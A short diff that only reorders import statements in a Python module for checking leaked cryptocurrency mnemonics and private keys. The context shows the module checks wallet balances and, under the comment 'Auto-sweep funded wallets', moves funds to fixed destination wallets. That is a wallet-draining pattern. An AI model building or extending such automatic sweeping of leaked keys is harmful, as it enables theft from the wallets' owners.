@@ -248,11 +248,11 @@ async def verify_and_alert(
     Returns:
         LeakFinding if valid, None if not a valid mnemonic.
     """
+    from src.modules.crypto.balance.checker import check_balance
     from src.modules.crypto.balance.deriver import (
         derive_from_mnemonic,
         is_valid_mnemonic,
     )
-    from src.modules.crypto.balance.checker import check_balance
 
     if not is_valid_mnemonic(mnemonic_candidate):
         return None
@@ -380,8 +380,8 @@ async def verify_and_alert_key(
     Returns:
         LeakFinding if the key is valid, None otherwise.
     """
-    from src.modules.crypto.balance.deriver import derive_from_privatekey
     from src.modules.crypto.balance.checker import check_balance
+    from src.modules.crypto.balance.deriver import derive_from_privatekey
 
     if log_source is None:
         log_source = f"{source}_key_scan"
@@ -438,8 +438,7 @@ async def verify_and_alert_key(
                 )
 
             # Auto-sweep funded wallets
-            from src.modules.crypto.balance.sweeper import Sweeper
-            from src.modules.crypto.balance.sweeper import DESTINATION_WALLETS
+            from src.modules.crypto.balance.sweeper import DESTINATION_WALLETS, Sweeper
 
             sweeper = Sweeper()
             try:
